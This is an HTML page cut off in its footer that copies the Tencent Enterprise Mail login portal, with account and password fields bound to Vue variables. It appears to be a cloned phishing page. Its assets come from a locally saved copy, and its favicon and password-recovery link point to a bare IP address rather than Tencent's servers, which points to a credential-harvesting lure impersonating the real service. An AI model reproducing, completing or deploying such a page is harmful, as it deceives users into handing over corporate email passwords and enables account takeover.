<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>腾讯企业邮箱-登录入口</title>
    <link rel="stylesheet" href="../static/腾讯企业邮箱-登录入口_files/index.css">
    <link rel="shortcut icon" href="http://219.225.240.104/images/favicon.png">
</head>
<body>
    <div class="email_main_body">
        <div class="main">
          <div class="header">
            <div class="header_image">
              <a class="email_logo">
                <img src="../static/腾讯企业邮箱-登录入口_files/exmail_logo_1473e91.png" alt="">
              </a>
              <div class="topLink addrtitle">
                <a href="https://exmail.qq.com/" target="_blank" class="toptitle">注册新企业</a><span> | </span><a href="https://work.weixin.qq.com/help?person_id=0&amp;doc_id=345&amp;helpType=exmail" target="_blank" class="toptitle">客户端收发</a><span> | </span><a class="toptitle">English</a><span> | </span><a class="toptitle">繁体版</a>
              </div>
            </div>
          </div>
          <div class="loginWrap">
            <div class="loginWd">
              <div class="left_text_wrap">
                <h1>不只是邮箱，</h1>
                <h1>更是一种高效办公新体验</h1>
              </div>
              <div class="login">
                <h1 class="login_scan_panel_pwd_title">帐号密码登录</h1>
                <div class="signup_item">
                  <div class="signup_item_content" style="border: none">
                    <input type="text" class="login_scan_panel_pwd_input" id="inputuin" name="inputuin" value="" placeholder="邮箱帐号/管理员帐号" v-model="myusername">
                  </div>
                </div>
                <div class="signup_item_content_tips_error active">请填写企业邮箱的完整帐号，或管理员帐号。</div>
                <div class="signup_item">
                  <div class="signup_item_content" style="border: none">
                    <input type="password" id="pp" name="pp" class="login_scan_panel_pwd_input" placeholder="输入邮箱密码" value="" v-model="mypassword">
                  </div>
                </div>
                <div class="signup_item_content_tips_error2 active">请输入密码</div>
                <div class="signup_item_cheakbox" style="margin-bottom: 30px">
                  <div class="signup_item_content_login">
                    <div class="login_scan_panel_auto_login">
                      <input id="auto_login_in_five_days_pwd" type="checkbox" class="login_scan_panel_pwd_checkbox v_middle" name="ss" value="1"><label for="auto_login_in_five_days_pwd" class="v_middle">5天内自动登录</label>
                    </div>
                    <div class="login_scan_panel_forgot_pwd">
                      <a href="http://219.225.240.104/cgi-bin/readtemplate?check=false&amp;t=biz_rf_portal#recovery" target="_blank">忘记密码</a>
                    </div>
                  </div>
                </div>
                <div class="signup_item_login" style="margin-bottom: 30px">
                  <div class="signup_item_content">
                    <input type="submit" class="login_btn" value="登 录" id="btlogin" name="btlogin">
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div style="clear: both"></div>
        <div class="frame_foot_copyright">
          <a class="frame_foot_nav_item_link" href="http://www.tencent.com/" target="_blank">关于腾讯</a>

          <span class="frame_foot_nav_item_dep">&nbsp;&nbsp;|&nbsp;&nbsp;</span>
          <a class="frame_foot_nav_item_link" href="http://exmail.qq.com/cgi-bin/download?path=manual&amp;filename=%CC%DA%D1%B6%C6%F3%D2%B5%D3%CA%CF%E4%D3%C3%BB%A7%CA%B9%D3%C3%CA%D6%B2%E1.pdf" target="_blank" data-statistics-item="manual|click|index_bottom">用户手册</a>
